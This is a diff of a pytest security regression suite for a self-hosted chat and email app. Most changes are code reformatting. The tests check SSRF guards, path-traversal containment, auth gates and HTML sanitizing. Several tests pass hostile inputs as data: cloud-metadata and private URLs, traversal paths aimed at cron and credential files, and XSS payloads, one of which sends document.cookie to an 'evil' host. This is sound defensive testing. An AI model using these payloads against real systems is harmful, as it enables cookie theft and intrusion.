@@ -22,6 +22,7 @@ import pytest
 
 # ── prompt-injection context wrapper ────────────────────────────
 
+
 def test_untrusted_context_message_is_not_system_role():
     from src.prompt_security import untrusted_context_message
 
@@ -44,11 +45,13 @@ def test_untrusted_context_policy_marks_sources_as_data():
 
 # ── secret_storage ─────────────────────────────────────────────
 
+
 def _import_secret_storage(tmp_path, monkeypatch):
     """Import src.secret_storage with the key file redirected to tmp."""
     # Make sure a previous test's cached module doesn't reuse its key.
     sys.modules.pop("src.secret_storage", None)
     from src import secret_storage  # noqa: WPS433
+
     monkeypatch.setattr(secret_storage, "_KEY_PATH", tmp_path / ".app_key")
     monkeypatch.setattr(secret_storage, "_fernet", None)
     return secret_storage
@@ -116,6 +119,7 @@ def test_secret_storage_key_created_with_safe_mode(tmp_path, monkeypatch):
 
 # ── secure-by-default deployment + integration storage ─────────
 
+
 def test_docker_compose_binds_web_ui_to_loopback_by_default():
     compose = Path("docker-compose.yml").read_text(encoding="utf-8")
     assert "${APP_BIND:-127.0.0.1}:${APP_PORT:-7000}:7000" in compose
@@ -135,11 +139,17 @@ def test_ollama_cookbook_runner_does_not_force_public_bind():
     route = Path("routes/cookbook_routes.py").read_text(encoding="utf-8")
     cookbook_js = Path("static/js/cookbook.js").read_text(encoding="utf-8")
     assert 'OLLAMA_HOST="0.0.0.0:${ODYSSEUS_OLLAMA_PORT}" ollama serve' not in route
-    assert 'OLLAMA_HOST="${ODYSSEUS_OLLAMA_HOST}:${ODYSSEUS_OLLAMA_PORT}" ollama serve' in route
+    assert (
+        'OLLAMA_HOST="${ODYSSEUS_OLLAMA_HOST}:${ODYSSEUS_OLLAMA_PORT}" ollama serve'
+        in route
+    )
     assert '_ollama_default_host = "0.0.0.0" if remote else "127.0.0.1"' in route
     assert "WARNING: remote Ollama will bind" in route
     assert "OLLAMA_HOST=0.0.0.0:${ollamaPort}" not in cookbook_js
-    assert "const bindHost = _envState.remoteHost ? '0.0.0.0' : '127.0.0.1';" in cookbook_js
+    assert (
+        "const bindHost = _envState.remoteHost ? '0.0.0.0' : '127.0.0.1';"
+        in cookbook_js
+    )
     assert "OLLAMA_HOST=${bindHost}:${ollamaPort}" in cookbook_js
 
 
@@ -148,6 +158,7 @@ def _import_integrations(tmp_path, monkeypatch):
     _import_secret_storage(tmp_path, monkeypatch)
     sys.modules.pop("src.integrations", None)
     from src import integrations  # noqa: WPS433
+
     monkeypatch.setattr(integrations, "DATA_FILE", str(tmp_path / "integrations.json"))
     return integrations
 
@@ -155,15 +166,17 @@ def _import_integrations(tmp_path, monkeypatch):
 def test_integrations_api_keys_are_encrypted_at_rest(tmp_path, monkeypatch):
     integrations = _import_integrations(tmp_path, monkeypatch)
 
-    integrations.save_integrations([
-        {
-            "id": "miniflux",
-            "name": "Miniflux",
-            "base_url": "https://rss.example",
-            "auth_type": "bearer",
-            "api_key": "secret-token",
-        }
-    ])
+    integrations.save_integrations(
+        [
+            {
+                "id": "miniflux",
+                "name": "Miniflux",
+                "base_url": "https://rss.example",
+                "auth_type": "bearer",
+                "api_key": "secret-token",
+            }
+        ]
+    )
 
     raw_text = (tmp_path / "integrations.json").read_text(encoding="utf-8")
     raw = json.loads(raw_text)
@@ -179,15 +192,17 @@ def test_integrations_plaintext_keys_migrate_on_load(tmp_path, monkeypatch):
     integrations = _import_integrations(tmp_path, monkeypatch)
     data_file = tmp_path / "integrations.json"
     data_file.write_text(
-        json.dumps([
-            {
-                "id": "legacy",
-                "name": "Legacy API",
-                "base_url": "https://api.example",
-                "auth_type": "header",
-                "api_key": "legacy-secret",
-            }
-        ]),
+        json.dumps(
+            [
+                {
+                    "id": "legacy",
+                    "name": "Legacy API",
+                    "base_url": "https://api.example",
+                    "auth_type": "header",
+                    "api_key": "legacy-secret",
+                }
+            ]
+        ),
         encoding="utf-8",
     )
 
@@ -202,9 +217,11 @@ def test_integrations_plaintext_keys_migrate_on_load(tmp_path, monkeypatch):
 
 # ── _q IMAP mailbox quoter ─────────────────────────────────────
 
+
 def _import_q():
     sys.modules.pop("routes.email_helpers", None)
     from routes.email_helpers import _q  # noqa: WPS433
+
     return _q
 
 
@@ -240,9 +257,11 @@ def test_q_empty_input():
 
 # ── provider auth error normalization ──────────────────────────
 
+
 def _import_friendly_email_auth_error():
     sys.modules.pop("routes.email_helpers", None)
     from routes.email_helpers import _friendly_email_auth_error  # noqa: WPS433
+
     return _friendly_email_auth_error
 
 
@@ -277,6 +296,7 @@ def test_generic_auth_error_still_passes_through_truncated():
 
 # ── compose-upload path traversal block ─────────────────────────
 
+
 @pytest.mark.parametrize(
     "token,expected",
     [
@@ -295,6 +315,7 @@ def test_path_name_strips_traversal(token, expected):
 
 
 # -- upload owner gates -------------------------------------------------------
+
 
 def _make_upload_store(tmp_path):
     upload_dir = tmp_path / "uploads"
@@ -388,6 +409,7 @@ def test_build_user_content_skips_cross_owner_attachments(tmp_path):
 def test_chat_preprocess_does_not_surface_cross_owner_attachment(tmp_path, monkeypatch):
     import asyncio
     from types import SimpleNamespace
+
     for mod_name in ("src.chat_handler", "routes.chat_helpers"):
         sys.modules.pop(mod_name, None)
     _stub_core_database_for_route_imports(monkeypatch)
@@ -431,8 +453,13 @@ def test_document_upload_lookup_rejects_cross_owner_marker(tmp_path, monkeypatch
     upload_dir, _alice_id, bob_id = _make_upload_store(tmp_path)
     handler = UploadHandler(str(tmp_path), str(upload_dir))
 
-    assert _locate_upload(str(upload_dir), bob_id, owner="alice", upload_handler=handler) is None
-    assert _locate_upload(str(upload_dir), bob_id, owner="bob", upload_handler=handler).endswith(bob_id)
+    assert (
+        _locate_upload(str(upload_dir), bob_id, owner="alice", upload_handler=handler)
+        is None
+    )
+    assert _locate_upload(
+        str(upload_dir), bob_id, owner="bob", upload_handler=handler
+    ).endswith(bob_id)
     sys.modules.pop("routes.document_helpers", None)
 
 
@@ -497,13 +524,16 @@ def test_pdf_marker_render_lookup_denies_cross_owner_without_doc_leak(tmp_path):
         def is_admin(_user):
             return False
 
-    assert handler.resolve_upload(bob_id, owner="alice", auth_manager=_AuthMgr()) is None
+    assert (
+        handler.resolve_upload(bob_id, owner="alice", auth_manager=_AuthMgr()) is None
+    )
     resolved = handler.resolve_upload(alice_id, owner="alice", auth_manager=_AuthMgr())
     assert resolved is not None
     assert resolved["path"].endswith(alice_id)
 
 
 # ── require_user dependency rejects anon callers ────────────────
+
 
 def test_require_user_rejects_unauthenticated(monkeypatch):
     """The shared auth dependency must raise 401 when the middleware
@@ -521,6 +551,7 @@ def test_require_user_rejects_unauthenticated(monkeypatch):
     class _AppState:
         class _Mgr:
             is_configured = True
+
         auth_manager = _Mgr()
 
     class _App:
@@ -545,6 +576,7 @@ def test_inprocess_pollers_gate(monkeypatch):
     `odysseus-mail poll-*` CLI subcommands instead. Two pollers racing
     on the same SQLite would mark scheduled rows as 'sent' twice."""
     import sys as _sys
+
     _sys.modules.pop("routes.email_pollers", None)
     from routes.email_pollers import _inprocess_pollers_enabled  # noqa: WPS433
 
@@ -576,6 +608,7 @@ def test_require_user_accepts_loopback_when_unconfigured(monkeypatch):
     class _AppState:
         class _Mgr:
             is_configured = False
+
         auth_manager = _Mgr()
 
     class _App:
@@ -609,6 +642,7 @@ def test_require_user_accepts_anyone_when_auth_disabled(monkeypatch):
             # Even with a prior admin account on disk, AUTH_ENABLED=false
             # must take precedence over is_configured=True.
             is_configured = True
+
         auth_manager = _Mgr()
 
     class _App:
@@ -641,6 +675,7 @@ def test_require_user_localhost_bypass_admits_loopback(monkeypatch):
     class _AppState:
         class _Mgr:
             is_configured = True
+
         auth_manager = _Mgr()
 
     class _App:
@@ -661,6 +696,7 @@ def test_require_user_localhost_bypass_still_rejects_lan(monkeypatch):
     """LOCALHOST_BYPASS=true must not extend to non-loopback callers —
     a LAN visitor still needs to authenticate."""
     from fastapi import HTTPException
+
     monkeypatch.setenv("AUTH_ENABLED", "true")
     monkeypatch.setenv("LOCALHOST_BYPASS", "true")
     sys.modules.pop("src.auth_helpers", None)
@@ -672,6 +708,7 @@ def test_require_user_localhost_bypass_still_rejects_lan(monkeypatch):
     class _AppState:
         class _Mgr:
             is_configured = True
+
         auth_manager = _Mgr()
 
     class _App:
@@ -703,6 +740,7 @@ def test_require_admin_rejects_unconfigured_public_api(monkeypatch):
     class _AppState:
         class _Mgr:
             is_configured = False
+
         auth_manager = _Mgr()
 
     class _App:
@@ -766,14 +804,18 @@ def test_auth_manager_migrates_legacy_admin_role(tmp_path):
     from core.auth import AuthManager
 
     auth_path = tmp_path / "auth.json"
-    auth_path.write_text(json.dumps({
-        "users": {
-            "admin": {
-                "password_hash": "unused",
-                "role": "admin",
+    auth_path.write_text(
+        json.dumps(
+            {
+                "users": {
+                    "admin": {
+                        "password_hash": "unused",
+                        "role": "admin",
+                    }
+                }
             }
-        }
-    }))
+        )
+    )
 
     mgr = AuthManager(str(auth_path))
 
@@ -782,7 +824,9 @@ def test_auth_manager_migrates_legacy_admin_role(tmp_path):
     assert data["users"]["admin"]["is_admin"] is True
 
 
-def _load_search_content_for_test(monkeypatch, name="services.search.content_under_test"):
+def _load_search_content_for_test(
+    monkeypatch, name="services.search.content_under_test"
+):
     import importlib.util
     import types as _types
 
@@ -826,9 +870,15 @@ def test_web_content_fetcher_blocks_private_url(monkeypatch):
 def test_web_content_fetcher_blocks_dns_to_private(monkeypatch):
     import ipaddress
 
-    content = _load_search_content_for_test(monkeypatch, "services.search.content_under_test_dns")
+    content = _load_search_content_for_test(
+        monkeypatch, "services.search.content_under_test_dns"
+    )
 
-    monkeypatch.setattr(content, "_resolve_hostname_ips", lambda host: [ipaddress.ip_address("10.0.0.5")])
+    monkeypatch.setattr(
+        content,
+        "_resolve_hostname_ips",
+        lambda host: [ipaddress.ip_address("10.0.0.5")],
+    )
 
     assert content._public_http_url("https://example.test/path") is False
 
@@ -854,40 +904,48 @@ import ipaddress as _ipaddr
 import pytest as _pytest
 
 
-@_pytest.mark.parametrize("url", [
-    "http://127.0.0.1/",                  # IPv4 loopback
-    "http://localhost/",                  # loopback by name
-    "http://10.0.0.5/",                   # private LAN 10/8
-    "http://172.16.0.1/",                 # private LAN 172.16/12
-    "http://192.168.1.1/",                # private LAN 192.168/16
-    "http://169.254.169.254/latest/",     # link-local / cloud metadata
-    "http://metadata.google.internal/",   # metadata by name
-    "http://[::1]/",                      # IPv6 loopback
-    "http://[fc00::1]/",                  # IPv6 unique-local (ULA)
-    "http://[fe80::1]/",                  # IPv6 link-local
-    "file:///etc/passwd",                 # unsupported scheme
-    "ftp://example.com/",                 # unsupported scheme
-])
+@_pytest.mark.parametrize(
+    "url",
+    [
+        "http://127.0.0.1/",  # IPv4 loopback
+        "http://localhost/",  # loopback by name
+        "http://10.0.0.5/",  # private LAN 10/8
+        "http://172.16.0.1/",  # private LAN 172.16/12
+        "http://192.168.1.1/",  # private LAN 192.168/16
+        "http://169.254.169.254/latest/",  # link-local / cloud metadata
+        "http://metadata.google.internal/",  # metadata by name
+        "http://[::1]/",  # IPv6 loopback
+        "http://[fc00::1]/",  # IPv6 unique-local (ULA)
+        "http://[fe80::1]/",  # IPv6 link-local
+        "file:///etc/passwd",  # unsupported scheme
+        "ftp://example.com/",  # unsupported scheme
+    ],
+)
 def test_web_fetch_guard_blocks_private_and_bad_schemes(url):
     from src.search.content import _public_http_url
+
     assert _public_http_url(url) is False
 
 
 def test_web_fetch_guard_allows_public_ip():
     from src.search.content import _public_http_url
+
     assert _public_http_url("http://93.184.216.34/") is True
 
 
 def test_web_fetch_guard_blocks_dns_resolving_to_private(monkeypatch):
     from src.search import content
-    monkeypatch.setattr(content, "_resolve_hostname_ips",
-                        lambda host: [_ipaddr.ip_address("10.0.0.5")])
+
+    monkeypatch.setattr(
+        content, "_resolve_hostname_ips", lambda host: [_ipaddr.ip_address("10.0.0.5")]
+    )
     assert content._public_http_url("https://innocent.example/") is False
 
 
 def test_web_fetch_guard_fails_closed_on_empty_resolution(monkeypatch):
     # A hostname that resolves to nothing must be treated as non-public.
     from src.search import content
+
     monkeypatch.setattr(content, "_resolve_hostname_ips", lambda host: [])
     assert content._public_http_url("https://innocent.example/") is False
 
@@ -898,8 +956,11 @@ def test_web_fetch_guard_blocks_redirect_into_private(monkeypatch):
     import httpx
     from src.search import content
 
-    monkeypatch.setattr(content, "_resolve_hostname_ips",
-                        lambda host: [_ipaddr.ip_address("93.184.216.34")])
+    monkeypatch.setattr(
+        content,
+        "_resolve_hostname_ips",
+        lambda host: [_ipaddr.ip_address("93.184.216.34")],
+    )
 
     class _Resp:
         status_code = 302
@@ -921,19 +982,24 @@ def test_web_fetch_guard_blocks_redirect_into_private(monkeypatch):
 
 # ── audit fixes (2026-06-01): email XSS, attachment traversal, authz ──
 
+
 def _import_attachment_extract_dir():
     sys.modules.pop("routes.email_helpers", None)
     from routes.email_helpers import attachment_extract_dir, ATTACHMENTS_DIR
+
     return attachment_extract_dir, ATTACHMENTS_DIR
 
 
-@pytest.mark.parametrize("folder,uid", [
-    ("../../../../tmp/evil", "1"),
-    ("INBOX", "../../etc/cron.d/x"),
-    ("a/../../b", "x"),
-    ("..", ".."),
-    ("/abs/path", "2"),
-])
+@pytest.mark.parametrize(
+    "folder,uid",
+    [
+        ("../../../../tmp/evil", "1"),
+        ("INBOX", "../../etc/cron.d/x"),
+        ("a/../../b", "x"),
+        ("..", ".."),
+        ("/abs/path", "2"),
+    ],
+)
 def test_attachment_extract_dir_stays_contained(folder, uid):
     """User-controlled folder/uid must never escape ATTACHMENTS_DIR — pins the
     fix for the attachment-extraction path traversal."""
@@ -956,7 +1022,12 @@ def test_diagnostics_routes_are_admin_gated():
     the global session check before)."""
     src = Path(__file__).resolve().parents[1] / "routes" / "diagnostics_routes.py"
     text = src.read_text()
-    for handler in ("get_database_stats", "get_rag_stats", "test_youtube", "test_research"):
+    for handler in (
+        "get_database_stats",
+        "get_rag_stats",
+        "test_youtube",
+        "test_research",
+    ):
         assert f"def {handler}(request: Request" in text, handler
     assert text.count("require_admin(request)") >= 4
 
@@ -1006,24 +1077,33 @@ def test_google_mcp_oauth_uses_configured_redirect_base(monkeypatch):
 
 def test_mcp_oauth_paths_resolve_under_data_dir(tmp_path, monkeypatch):
     mcp_routes = _import_mcp_routes()
-    monkeypatch.setattr(mcp_routes, "MCP_OAUTH_DIR", str(tmp_path / "data" / "mcp_oauth"))
+    monkeypatch.setattr(
+        mcp_routes, "MCP_OAUTH_DIR", str(tmp_path / "data" / "mcp_oauth")
+    )
 
-    resolved = Path(mcp_routes._resolve_mcp_oauth_path("gmail/credentials.json", "token_file"))
+    resolved = Path(
+        mcp_routes._resolve_mcp_oauth_path("gmail/credentials.json", "token_file")
+    )
 
     base = (tmp_path / "data" / "mcp_oauth").resolve()
     assert resolved == base / "gmail" / "credentials.json"
 
 
-@pytest.mark.parametrize("raw_path", [
-    "../../etc/passwd",
-    "/tmp/evil.keys",
-    "~/.gmail-mcp/credentials.json",
-])
+@pytest.mark.parametrize(
+    "raw_path",
+    [
+        "../../etc/passwd",
+        "/tmp/evil.keys",
+        "~/.gmail-mcp/credentials.json",
+    ],
+)
 def test_mcp_oauth_paths_reject_escapes(tmp_path, monkeypatch, raw_path):
     from fastapi import HTTPException
 
     mcp_routes = _import_mcp_routes()
-    monkeypatch.setattr(mcp_routes, "MCP_OAUTH_DIR", str(tmp_path / "data" / "mcp_oauth"))
+    monkeypatch.setattr(
+        mcp_routes, "MCP_OAUTH_DIR", str(tmp_path / "data" / "mcp_oauth")
+    )
 
     with pytest.raises(HTTPException) as exc:
         mcp_routes._resolve_mcp_oauth_path(raw_path, "token_file")
@@ -1034,23 +1114,31 @@ def test_mcp_oauth_filename_join_cannot_escape_base(tmp_path, monkeypatch):
     from fastapi import HTTPException
 
     mcp_routes = _import_mcp_routes()
-    monkeypatch.setattr(mcp_routes, "MCP_OAUTH_DIR", str(tmp_path / "data" / "mcp_oauth"))
+    monkeypatch.setattr(
+        mcp_routes, "MCP_OAUTH_DIR", str(tmp_path / "data" / "mcp_oauth")
+    )
 
     safe_dir = mcp_routes._resolve_mcp_oauth_path("gmail", "dir")
     with pytest.raises(HTTPException):
-        mcp_routes._resolve_mcp_oauth_path(Path(safe_dir) / "../../escape.json", "filename")
+        mcp_routes._resolve_mcp_oauth_path(
+            Path(safe_dir) / "../../escape.json", "filename"
+        )
 
 
 def test_mcp_oauth_config_sanitizes_paths_and_env(tmp_path, monkeypatch):
     mcp_routes = _import_mcp_routes()
-    monkeypatch.setattr(mcp_routes, "MCP_OAUTH_DIR", str(tmp_path / "data" / "mcp_oauth"))
+    monkeypatch.setattr(
+        mcp_routes, "MCP_OAUTH_DIR", str(tmp_path / "data" / "mcp_oauth")
+    )
 
-    cfg = mcp_routes._sanitize_mcp_oauth_config({
-        "provider": "google",
-        "keys_file": "gmail/gcp-oauth.keys.json",
-        "token_file": "gmail/credentials.json",
-        "scopes": ["https://www.googleapis.com/auth/gmail.modify"],
-    })
+    cfg = mcp_routes._sanitize_mcp_oauth_config(
+        {
+            "provider": "google",
+            "keys_file": "gmail/gcp-oauth.keys.json",
+            "token_file": "gmail/credentials.json",
+            "scopes": ["https://www.googleapis.com/auth/gmail.modify"],
+        }
+    )
     env = {}
     mcp_routes._apply_mcp_oauth_env(env, cfg)
 
@@ -1064,7 +1152,9 @@ def test_mcp_oauth_config_sanitizes_paths_and_env(tmp_path, monkeypatch):
 def test_gmail_mcp_preset_uses_contained_oauth_paths():
     src = Path(__file__).resolve().parents[1] / "static" / "js" / "admin.js"
     text = src.read_text()
-    preset = text.split('{ name: "Gmail"', 1)[1].split('{ name: "Email (IMAP/SMTP)"', 1)[0]
+    preset = text.split('{ name: "Gmail"', 1)[1].split(
+        '{ name: "Email (IMAP/SMTP)"', 1
+    )[0]
 
     assert "~/.gmail-mcp" not in preset
     assert 'oauthFile: { dir: "gmail"' in preset
@@ -1072,8 +1162,8 @@ def test_gmail_mcp_preset_uses_contained_oauth_paths():
     assert 'token_file: "gmail/credentials.json"' in preset
 
 
-
 # -- export/gallery filename hardening ----------------------------------------
+
 
 def _drop_route_module_cache(dotted_name):
     """Evict a cached route module from both sys.modules and the parent package
@@ -1107,7 +1197,9 @@ def _import_gallery_routes_for_filename():
 def test_export_filename_sanitizer_blocks_header_and_path_chars():
     mod = _import_session_routes_for_filename()
 
-    out = mod._sanitize_export_filename('chat.md\r\nX-Test: yes/..\\evil;quote".txt\x00')
+    out = mod._sanitize_export_filename(
+        'chat.md\r\nX-Test: yes/..\\evil;quote".txt\x00'
+    )
 
     assert out
     assert len(out) <= 128
@@ -1118,7 +1210,10 @@ def test_export_filename_sanitizer_blocks_header_and_path_chars():
 def test_export_filename_sanitizer_preserves_safe_names():
     mod = _import_session_routes_for_filename()
 
-    assert mod._sanitize_export_filename("conversation_20260602.md") == "conversation_20260602.md"
+    assert (
+        mod._sanitize_export_filename("conversation_20260602.md")
+        == "conversation_20260602.md"
+    )
     assert mod._sanitize_export_filename("") == ""
 
 
@@ -1134,9 +1229,12 @@ def test_gallery_replace_filename_sanitizer_uses_basename():
 
 def test_gallery_replace_filename_sanitizer_falls_back_when_empty(monkeypatch):
     mod = _import_gallery_routes_for_filename()
-    monkeypatch.setattr(mod.uuid, "uuid4", lambda: types.SimpleNamespace(hex="abcdef1234567890"))
+    monkeypatch.setattr(
+        mod.uuid, "uuid4", lambda: types.SimpleNamespace(hex="abcdef1234567890")
+    )
 
     assert mod._sanitize_gallery_filename("../") == "abcdef123456"
+
 
 def test_chat_active_document_lookup_is_owner_scoped():
     """The explicit `active_doc_id` path in /api/chat_stream must scope the
@@ -1167,12 +1265,16 @@ def test_chat_active_document_lookup_is_owner_scoped():
 # under a relaxed `script-src 'unsafe-inline'` CSP, so any markup surviving into
 # the report would execute in the app origin. The render must allowlist-sanitize.
 
-@pytest.mark.parametrize("payload", [
-    "<script>alert(document.domain)</script>",
-    '<img src=x onerror="fetch(\'//evil/\'+document.cookie)">',
-    "<svg onload=alert(1)>",
-    '<a href="javascript:alert(1)">x</a>',
-])
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        "<script>alert(document.domain)</script>",
+        "<img src=x onerror=\"fetch('//evil/'+document.cookie)\">",
+        "<svg onload=alert(1)>",
+        '<a href="javascript:alert(1)">x</a>',
+    ],
+)
 def test_md_to_html_strips_active_content(payload):
     from src.visual_report import _md_to_html
 
@@ -1196,12 +1298,12 @@ def test_md_to_html_preserves_normal_report_formatting():
     )
     out = _md_to_html(md)
 
-    assert "<h2 id=" in out                          # heading + toc anchor preserved
-    assert "<table" in out and "<td" in out           # table
-    assert "<pre" in out and "<code" in out           # fenced code block
-    assert "<details" in out and "<summary" in out    # collapsible raw-findings section
-    assert 'href="https://example.com/p"' in out      # external link kept
-    assert 'rel="noopener' in out                     # ...and rel-hardened
+    assert "<h2 id=" in out  # heading + toc anchor preserved
+    assert "<table" in out and "<td" in out  # table
+    assert "<pre" in out and "<code" in out  # fenced code block
+    assert "<details" in out and "<summary" in out  # collapsible raw-findings section
+    assert 'href="https://example.com/p"' in out  # external link kept
+    assert 'rel="noopener' in out  # ...and rel-hardened
 
 
 def test_visual_report_escapes_request_category():
@@ -1217,8 +1319,8 @@ def test_visual_report_escapes_request_category():
         category='"><script>alert(document.domain)</script>',
     )
 
-    assert "<script>alert(document.domain)" not in html   # no breakout
-    assert "&lt;script&gt;" in html                        # rendered as inert text
+    assert "<script>alert(document.domain)" not in html  # no breakout
+    assert "&lt;script&gt;" in html  # rendered as inert text
 
     # `category` has no type check at the request boundary, so a non-string
     # value must coerce rather than crash the render (html.escape needs a str).
